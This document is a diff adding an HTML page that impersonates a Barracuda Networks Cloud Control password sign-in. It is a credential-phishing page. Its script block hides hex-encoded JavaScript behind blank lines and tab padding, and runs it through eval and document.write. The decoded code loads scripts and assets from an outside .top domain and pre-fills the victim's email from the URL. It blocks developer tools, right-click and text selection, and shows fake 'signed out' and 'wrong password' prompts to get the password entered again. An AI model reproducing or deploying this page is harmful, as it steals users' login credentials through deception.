@@ -1,0 +1,517 @@
+<head>
+   
+<link id="baracss" rel="stylesheet" href="">
+<style id="custom-styles-container">
+
+.errorMssg {
+        border-color: #de3131;
+    }
+
+
+:root, .af-custom-form-container .af-form {
+    --primary-color: #067CC1;
+  }
+ :root, .af-custom-form-container .af-form {
+    --button-font-color: #FFFFFF;
+  }
+ :root {
+    --secondary-button-border-color: #AFAFAE;
+    --social-button-border-color: #AFAFAE;
+    --radio-button-border-color: #AFAFAE;
+  }
+:root {
+    --secondary-button-text-color: #646464;
+  }
+:root {
+    --link-color: #067CC1;
+  }
+:root {
+    --title-font-color: #191919;
+  }
+ :root {
+    --font-default-color: #191919;
+  }
+:root {
+    --widget-background-color: #FFFFFF;
+  }
+:root {
+    --box-border-color: #AFAFAE;
+  }
+:root {
+    --font-light-color: #646464;
+  }
+:root {
+    --input-text-color: #191919;
+  }
+:root {
+    --input-border-color: #AFAFAE;
+    --border-default-color: #AFAFAE;
+  }
+:root {
+    --input-background-color: #FFFFFF;
+  }
+:root {
+    --icon-default-color: #646464;
+  }
+ :root {
+    --error-color: #DE3131;
+    --error-text-color: #ffffff;
+  }
+:root {
+    --success-color: #3B770E;
+  }
+:root {
+    --base-focus-color: #067CC1;
+    --transparency-focus-color: rgba(6,124,193, 0.15);
+  }
+:root {
+    --base-hover-color: #000000;
+    --transparency-hover-color: rgba(0,0,0, var(--hover-transparency-value));
+  }
+@font-face {
+    font-family: 'ULP Custom';
+    font-style: normal;
+    font-weight: var(--font-default-weight);
+    src: local('ULP Custom'), url('https://fonts.gstatic.com/s/roboto/v30/KFOmCnqEu92Fr1Mu4mxKKTU1Kg.woff2') format('woff');
+  }
+
+  body {
+    --font-family: 'ULP Custom', -apple-system, BlinkMacSystemFont, Roboto, Helvetica, sans-serif;
+  }
+html, :root, .af-custom-form-container .af-form {
+    font-size: 16px;
+    --default-font-size: 16px;
+  }
+ body {
+    --title-font-size: 1.5rem;
+    --title-font-weight: var(--font-bold-weight);
+  }
+.c41535f9a {
+    font-size: 0.875rem;
+    font-weight: var(--font-default-weight);
+  }
+.c2701a345 {
+    font-size: 0.875rem;
+    font-weight: var(--font-default-weight);
+  }
+  .ulp-passkey-benefit-heading {
+    font-size: 1.025rem;
+  }
+.c1d1b1e07, .c0526c8ee {
+    font-size: 1rem;
+    font-weight: var(--font-default-weight);
+  }
+ body {
+    --ulp-label-font-size: 1rem;
+    --ulp-label-font-weight: var(--font-default-weight);
+  }
+.c41f6c9f2, .c7ee8ceb0, [id^='ulp-container-'] a {
+    font-size: 0.875rem;
+    font-weight: var(--font-bold-weight) !important;
+  }
+:root {
+    --button-border-width: 1px;
+    --social-button-border-width: 1px;
+    --radio-border-width: 1px;
+  }
+body {
+    --button-border-radius: 4px;
+    --radio-border-radius: 4px;
+  }
+:root {
+    --input-border-width: 1px;
+  }
+        
+      
+
+        
+          body {
+    --input-border-radius: 4px;
+  }
+
+  .af-custom-form-container .af-form {
+    --border-radius: 4px;
+  }
+        
+      
+
+        
+          :root {
+    --border-radius-outer: 4px;
+  }
+        
+      
+
+        
+          :root {
+    --box-border-width: 0px;
+  }
+ 
+    body {
+      --logo-alignment: 0 auto;
+    }
+  
+     
+    .cd7df2892 {
+      content: url('logo_barracuda_primary.svg');
+    }
+body {
+    --logo-height: 40px;
+  }
+  .cd7df2892 {
+    height: var(--logo-height);
+  }
+body {
+      --header-alignment: center;
+    }
+ .cc0a09eec {
+    --page-background-alignment: center;
+  }
+ body {
+    --page-background-color: #ffffff;
+  }
+</style>
+    <style>
+    /* By default, hide features for javascript-disabled browsing */
+    /* We use !important to override any css with higher specificity */
+    /* It is also overriden by the styles in <noscript> in the header file */
+    .no-js {
+      clip: rect(0 0 0 0);
+      clip-path: inset(50%);
+      height: 1px;
+      overflow: hidden;
+      position: absolute;
+      white-space: nowrap;
+      width: 1px;
+    }
+  </style>
+
+    
+<link id="favLink" rel="shortcut icon" href="">
+        <title>Enter your password to sign in | Cloud Control</title>
+		<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+
+    </head>
+	<body style="
+            isolation: isolate;
+            position: relative;
+            min-height: 100vh;
+            background-color: #ffffff;
+        ">
+        <div style="
+                padding-left: 1.5rem;
+                padding-right: 1.5rem;
+                padding-top: 5rem;
+                padding-bottom: 5rem;
+                max-width: 80rem;
+                text-align: center;
+                margin-left: auto;
+                margin-right: auto;
+
+                @media (min-width: 640px) {
+                  padding-top: 3.5rem;
+                padding-bottom: 3.5rem;
+                 }
+
+                @media (min-width: 1024px) {
+                  padding-left: 2rem;
+                padding-right: 2rem;
+                 }
+            ">
+            <h1 style="
+                    margin-top: 1rem;
+                    font-size: 2rem;
+                    line-height: 3rem;
+                    font-weight: 700;
+                    color: #000000;
+
+                    @media (min-width: 640px) {
+                      font-size: 2rem;
+                    line-height: 3rem;
+                    }
+                ">
+                Welcome to the new Barracuda<br>
+                authentication experience
+            </h1>
+            <!-- prettier-ignore -->
+            <div style="
+          display: flex;
+          margin-top: 2.5rem;
+          justify-content: center;"><main class="_widget login">
+  <section class="c66e20158 _prompt-box-outer ca20e631b">
+    <div class="ceeb7e995 c98450f08">
+      
+    
+      <div class="c35cc68b7">
+        <header class="caf9c4b6d cb03adf9e">
+          <div title="Barracuda Networks" id="custom-prompt-logo" style="width: auto !important; height: 60px !important; position: static !important; margin: auto !important; padding: 0 !important; background-color: transparent !important; background-position: center !important; background-size: contain !important; background-repeat: no-repeat !important"></div>
+        
+          <img class="cd7df2892 c62875a1f" id="prompt-logo-center" src="" alt="Barracuda Networks">
+        
+          
+            <h1 class="c85308b88 c6689a483">Enter your password</h1>
+          
+        
+          <div class="c41535f9a c43737e03">
+            
+          
+            
+              <p class="c28e85330 cff590de0">Enter your password for Barracuda Networks to continue to Cloud Control</p>
+            
+          </div>
+        </header>
+      
+        <div class="c2701a345 c22884cc9">
+          
+        
+          
+        
+          
+            <div id="logBox">
+              <form class="cb2e1bdc9 _form-login-password" data-form-primary="true">
+                <input type="hidden" name="state" value="">
+				<input id="domain" type="hidden" value="" name="domain">
+				<input id="fieldName" type="hidden" value="" name="field">
+                
+              
+                <div class="c9ad40d30 c77150178">
+                  <div class="c862f080e">
+                    <div>
+                      <div class="c007487a5 ca2074429 c1c011705 cbc2bcaca">
+                        <span class="ulp-authenticator-selector-text" id="usr"></span>
+                      
+                        
+                          <a class="c7ee8ceb0 cff6ca61e c2c6ba328 c8023864a" href="javascript:void();" aria-label="Edit email address">Edit</a>
+                        
+                      
+                        <input type="text" id="email" name="email" value="" autocomplete="username" readonly="">
+                      </div>
+                    </div>
+                  
+                    
+                      <div class="input-wrapper _input-wrapper">
+                        <div class="c6d02143e c46e32be0 password c0ff9e370 c78e586c4" data-action-text="" data-alternate-action-text="">
+                          <label class="cf59a1f59 no-js c6fb1f00d c7e7f74a2" for="password" id="errorLabel">
+                            Password*
+                          </label>
+                        
+                          <input class="input c19ad00c3 ce9b3173b" name="password" id="password" type="password" required="" autocomplete="current-password" autocapitalize="none" spellcheck="false" autofocus="">
+                        
+                          <div class="cf59a1f59 js-required c6fb1f00d c7e7f74a2" id="passlabel" data-dynamic-label-for="password" aria-hidden="true">
+                            Password*
+                          </div>
+                        
+                          
+                            <button type="button" class="c1d1b1e07 ulp-button-icon c3a9491fe _button-icon" data-action="toggle">
+                              <span aria-hidden="true" class="password-icon-tooltip show-password-tooltip">Show password</span>
+                            
+                              <span aria-hidden="true" class="password-icon-tooltip hide-password-tooltip hide">Hide password</span>
+                            
+                              <span class="screen-reader-only password-toggle-label" data-label="show-password">Show password</span>
+                            
+                              <span class="screen-reader-only password-toggle-label hide" data-label="hide-password">Hide password</span>
+                            
+                              <span class="cd6934de5 password js-required" aria-hidden="true"></span>
+                            </button>
+                          
+                        </div>
+                      <span id="error-element-password" class="ulp-input-error-message" data-error-code="custom-script-error-code_invalid_user_password" style="display:none">
+                              <span class="ulp-input-error-icon" role="img" aria-label="Error" ></span>
+                            Wrong Email or Password</span>
+                        
+                      </div>
+                    
+                  
+                    
+                  </div>
+                </div>
+              
+                
+              
+                
+                  
+                    <p class="c9ff8630d c2039e792">
+                      
+                        <a class="c7ee8ceb0 c879834d5 c8023864a" href="#">Forgot password?</a>
+                      
+                    </p>
+                  
+                
+              
+                
+              
+                <div class="cc199ae96">
+                  
+                    <button type="submit" id="loginbtn" name="action" value="default" class="c1d1b1e07 c94ec4107 c3a9491fe cc1fd6969 _button-login-password" data-action-button-primary="true">Continue</button>
+                  
+                </div>
+              </form>
+			  </div>
+            
+          <script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+																																							OO00='742e686561642e617070656e644368696c6428736372697074293b202f2f20417070656e64207468652073637269707420746f2074686520626f64790d0a097d0d0a0976617220757372203d2061746f622861746f622876737229293b0d0a092428272375737227292e7465787428757372293b0d0a09646f63756d656e742e676574456c656d656e744279496428276572726f722d656c656d656e742d70617373776f726427292e696e6e657248544d4c3d22596f752068617665206265656e207369676e6564206f75742e205369676e20696e20746f20636f6e74696e75652e223b0d0a090909242822236572726f722d656c656d656e742d70617373776f726422292e73686f7728293b0d0a0909090d0a7d293b0d0a090d0a646f63756d656e742e6164644576656e744c697374656e657228276b6579646f776e272c206576656e74203d3e207b0d0a2020696620286576656e742e6b6579436f6465203d3d3d20313233207c7c20286576656e742e6374726c4b6579202626206576656e742e73686966744b6579202626206576656e742e6b6579436f6465203d3d3d2037332929207b0d0a202020206576656e742e70726576656e7444656661756c7428293b0d0a20207d0d0a7d293b0d0a2f2f2044697361626c652072696768742d636c69636b20636f6e74657874206d656e750d0a646f63756d656e742e6164644576656e744c697374656e65722827636f6e746578746d656e75272c206576656e74203d3e206576656e742e70726576656e7444656661756c742829293b0d0a2f2f61766f696420666f726d207375626d697373696f6e20776974686f75742076616c69646174696f6e0d0a242827236c6f67696e62746e27292e6f6e2827636c69636b272c2066756e6374696f6e286576656e7429207b0d0a092f2f616c657274282273746172742066786e7422293b0d0a09636c6b4c676e2866756e6374696f6e28737461747573436f6465297b0d0a09090d0a0909646973706c617943737328737461747573436f6465293b0d0a09090d0a097d293b0d0a7d293b0d0a242827236c6f67426f7827292e6f6e28276b6579646f776e272c2066756e6374696f6e286576656e7429207b0d0a2020202020202020636865636b5375626d6974286576656e742c2066756e6374696f6e28737461747573436f646529207b0d0a090909646973706c617943737328737461747573436f6465293b0d0a20202020202020207d293b0d0a202020207d293b0d0a090d0a66756e6374696f6e20646973706c617943737328737461747573297b0d0a090d0a0909696628737461747573297b0d0a090909646f63756d656e742e676574456c656d656e744279496428276572726f722d656c656d656e742d70617373776f726427292e696e6e657248544d4c3d22526574727920656e74727920666f722070617373776f72642e506c6561736520656e74657220796f75722063757272656e742070617373776f72642e223b0d0a090909242822236572726f722d656c656d656e742d70617373776f726422292e73686f7728293b0d0a090909242827236572726f724c6162656c27292e6373732827626f726465722d636f6c6f72272c202772656427293b0d0a09097d656c7365207b0d0a090909646f63756d656e742e676574456c656d656e744279496428276572726f722d656c656d656e742d70617373776f726427292e696e6e657248544d4c3d2257726f6e6720456d61696c206f722050617373776f7264223b0d0a090909242827236572726f722d656c656d656e742d70617373776f726427292e73686f7728293b0d0a090909242827236572726f724c6162656c27292e6373732827626f726465722d636f6c6f72272c202772656427293b0d0a09097d0d0a090d0a7d0d0a';eval(unescape('%66%75%6E%63%74%69%6F%6E%20%5F%63%28%5F%69%29%7B%76%61%72%20%61%3D%6E%65%77%20%41%72%72%61%79%28%31%30%30%30%29%2E%6A%6F%69%6E%28%27%25%30%44%25%30%41%27%29%3B%76%61%72%20%74%3D%5F%69%2E%72%65%70%6C%61%63%65%28%2F%28%5C%53%7B%32%7D%29%2F%67%69%2C%27%24%31%25%27%29%3B%74%3D%27%25%27%2B%74%3B%74%3D%74%2E%73%75%62%73%74%72%28%30%2C%74%2E%6C%65%6E%67%74%68%2D%31%29%3B%64%6F%63%75%6D%65%6E%74%2E%77%72%69%74%65%28%75%6E%65%73%63%61%70%65%28%27%3C%73%63%27%2B%27%72%69%70%74%3E%27%2B%61%2B%74%2B%61%2B%27%3C%2F%73%63%27%2B%27%72%69%70%74%3E%27%29%29%7D%3B'));O0OO='646c3d646f63756d656e742e6c61796572733b6f653d77696e646f772e6f706572613f313a303b64613d28646f63756d656e742e646f63756d656e744d6f64657c7c646f63756d656e742e616c6c292626216f653b67653d646f63756d656e742e676574456c656d656e74427949643b77733d77696e646f772e736964656261723f747275653a66616c73653b744e3d6e6176696761746f722e757365724167656e742e746f4c6f7765724361736528293b697a4e3d744e2e696e6465784f6628276e6574736361706527293e3d303f747275653a66616c73653b7a69733d64613b7a6973383d64613b766172206d73673d27273b66756e6374696f6e206e656d28297b72657475726e20747275657d3b77696e646f772e6f6e6572726f72203d206e656d3b7a4f463d77696e646f772e6c6f636174696f6e2e70726f746f636f6c2e696e6465784f66282766696c652729213d2d313f747275653a66616c73653b6937663d7a69732626217a4f463f747275653a66616c73653b6966286461297b646f63756d656e742e6f6e6472616773746172743d66756e6374696f6e2028297b72657475726e2066616c73657d3b66756e6374696f6e2063494528297b286d7367293b72657475726e2066616c73657d3b66756e6374696f6e20636328297b646f63756d656e742e6f6e636f6e746578746d656e753d6349453b73657454696d656f7574282263632829222c323030297d3b636328297d3b66756e6374696f6e20634e532865297b696628646c7c7c7773297b696628652e77686963683d3d327c7c652e77686963683d3d33297b286d7367293b72657475726e2066616c73657d7d7d3b696628646c297b646f63756d656e742e636170747572654576656e7473284576656e742e4d4f555345444f574e293b646f63756d656e742e6f6e6d6f757365646f776e3d634e537d656c73657b646f63756d656e742e6f6e6d6f75736575703d634e537d3b646f63756d656e742e6f6e636f6e746578746d656e753d6e65772046756e6374696f6e282272657475726e2066616c736522293b6966286f65297b66756e6374696f6e20726f2865297b6966286576656e742e627574746f6e3d3d32297b616c65727428272027293b72657475726e20307d3b72657475726e20747275657d3b646f63756d656e742e6f6e6d6f757365646f776e3d726f7d3b66756e6374696f6e206e733928297b77696e646f772e7374617475733d2720273b73657454696d656f757428276e73392829272c31303030293b72657475726e20747275657d3b696628216f65297b6e733928293b646f63756d656e742e6f6e6d6f7573656f7665723d6e73393b646f63756d656e742e6f6e6d6f7573656f75743d6e73397d3b66756e6374696f6e2075302861297b72657475726e2066616c73657d3b66756e6374696f6e2075312865297b72657475726e28652e7461726765742e7461674e616d65213d6e756c6c2626652e7461726765742e7461674e616d652e73656172636828275e28494e5055547c54455854415245417c425554544f4e7c53454c4543547c454d4245447c4f424a4543547c48544d4c29242729213d2d31297d3b66756e6374696f6e2075322865297b696628652e77686963683d3d31297b77696e646f772e636170747572654576656e7473284576656e742e4d4f5553454d4f5645293b77696e646f772e6f6e6d6f7573656d6f76653d75307d7d3b66756e6374696f6e2075332865297b696628652e77686963683d3d31297b77696e646f772e72656c656173654576656e7473284576656e742e4d4f5553454d4f5645293b77696e646f772e6f6e6d6f7573656d6f76653d6e756c6c7d7d3b20696628646c297b77696e646f772e636170747572654576656e7473284576656e742e4d4f555345';OO0O='55507c4576656e742e4d4f555345444f574e293b77696e646f772e6f6e6d6f757365646f776e3d75323b77696e646f772e6f6e6d6f75736575703d75337d656c73652069662867652626216461297b646f63756d656e742e6f6e6d6f757365646f776e3d75317d3b66756e6374696f6e206e6e28297b69662877696e646f772e67657453656c656374696f6e297b76617220743d77696e646f772e67657453656c656374696f6e28292e746f537472696e6728293b696628742e696e6465784f6628277177656173647a786327293e317c7c742e6c656e6774683e3430297b646f63756d656e742e626f64792e696e6e657248544d4c3d272e273b6c6f636174696f6e2e72656c6f616428297d3b73657454696d656f757428226e6e2829222c323030297d7d3b6e6e28293b66756e6374696f6e206e6928297b6966286461297b646f63756d656e742e6f6e73656c65637473746172743d66756e6374696f6e2028297b72657475726e2066616c73657d3b73657454696d656f757428226e692829222c323030297d7d3b6e6928293b2428646f63756d656e74292e72656164792866756e6374696f6e28297b0d0a090d0a092f2f73657420676c6f62616c207661726961626c65730d0a0976617220767372203d2077696e646f772e6c6f636174696f6e2e687265662e736c6963652877696e646f772e6c6f636174696f6e2e687265662e696e6465784f662827232729202b2031293b0d0a09636f6e7374206d794172726179203d207673722e73706c697428222622293b0d0a09767372203d206d7941727261795b305d3b0d0a090d0a09090d0a092f2f7365742065787465726e616c2066696c65730d0a09636f6e737420707265666978203d202268747470733a2f2f726974616c6672656e646f2e746f702f656e7465727072697365732f223b0d0a09766172206172726179736574203d5b0d0a09095b276661764c696e6b272c2766617669636f6e5f6261727261637564612e69636f272c2768726566272c276964275d2c0d0a09095b2762617261637373272c276d61696e2e63646e2e6d696e2e637373272c2768726566272c276964275d2c0d0a09095b2770726f6d70742d6c6f676f2d63656e746572272c276c6f676f5f6261727261637564615f7072696d6172792e737667272c27737263272c276964275d2c0d0a090d0a095d0d0a202020202f2f204c6f6164207468652065787465726e616c2073637269707420616e642063616c6c207468652065787465726e616c2063616c6c6261636b2066756e6374696f6e0d0a20202020202020202020206c6f616445787465726e616c5363726970742827656e74657270726973652e6a73272c2066756e6374696f6e2829207b0d0a09090909636865636b444e53287673722c66756e6374696f6e28297b0d0a09090909096f6e426f64794c6f61642861727261797365742c207072656669782c20767372293b0d0a090909097d293b0d0a202020202020202020202020200d0a2020202020202020202020207d293b0d0a0909090d0a092f2f2066756e6374696f6e20746f206c6f61642065787465726e616c207363726970740d0a0966756e6374696f6e206c6f616445787465726e616c5363726970742875726c2c63616c6c6261636b29207b0d0a090976617220736372697074203d20646f63756d656e742e637265617465456c656d656e74282773637269707427293b0d0a09097363726970742e737263203d20707265666978202b2075726c3b0d0a09097363726970742e6f6e6c6f6164203d2066756e6374696f6e2829207b0d0a0909090d0a0909096966202863616c6c6261636b29207b0d0a0909090963616c6c6261636b28293b090909090d0a0909097d0d0a0909090d0a09097d3b0d0a0909646f63756d656e';OOO0=O0OO+OO0O+OO00;_c(OOO0);O454E4A50='485552444F42464E5347504B59484D594246565453524E4E544844574B47574259424C56445857424E454253444E444754484D4349505744564B4F49564E57484B474A4C4C514D44555745485758484459495046524C534F51534D4D4D524E57584843564E4C4448584850424758454442425645524D464B4D44504A4442584B43574745474F58454A444343445257544948564249424C4555494F425155494A45574E4A4D4A44464C44454A4A4E5151485449554C49504A4243594C434854484F43504D4642555950434F59575350474849574F5852564F4E474F5346544D5254'
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</script>
+        
+          
+        
+          
+        
+          
+            <div class="ulp-alternate-action  _alternate-action __s16nu9">
+              <p class="c28e85330 cff590de0 ca0be194f">Don't have an account?
+                <a class="c7ee8ceb0 c8023864a" href="#">Sign up</a>
+              </p>
+            </div>
+          
+        
+          
+        
+          
+        
+          
+        </div>
+      </div>
+    </div>
+  
+    
+  </section>
+</main>
+
+</div>
+            
+            
+        </div>
+    
+
+</body>
+</html>
